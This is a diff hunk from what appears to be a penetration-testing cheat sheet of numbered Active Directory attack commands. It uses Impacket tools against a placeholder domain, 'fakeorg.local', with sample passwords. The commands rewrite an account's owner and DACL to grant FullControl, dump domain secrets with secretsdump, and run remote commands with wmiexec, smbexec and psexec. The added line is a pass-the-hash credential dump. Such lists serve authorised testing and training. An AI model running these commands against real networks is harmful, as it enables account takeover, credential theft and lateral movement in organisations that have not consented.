@@ -326,6 +326,7 @@ enum4linux -a target                  # Enumerate shares/users 🔍
 116. impacket-owneredit -action write -target bob.smith -new-owner jane.smith 'fakeorg.local/john.doe:Passw0rd123!' -dc-ip 192.168.1.100
 117. python3 /usr/share/doc/python3-impacket/examples/dacledit.py -action write -rights FullControl -principal jane.smith -target bob.smith 'fakeorg.local/john.doe:Passw0rd123!' -dc-ip 192.168.1.100
 118. impacket-secretsdump fakeorg.local/jane.smith:SecurePass456@@192.168.1.100
+000. impacket-secretsdump -hashes :<NTLM_HASH> fakeorg.local/jane.smith@192.168.1.100
 119. impacket-wmiexec fakeorg.local/john.doe:Passw0rd123!@192.168.1.100 "whoami"
 120. impacket-smbexec fakeorg.local/jane.smith:SecurePass456@@192.168.1.100
 121. impacket-psexec fakeorg.local/john.doe:Passw0rd123!@192.168.1.100
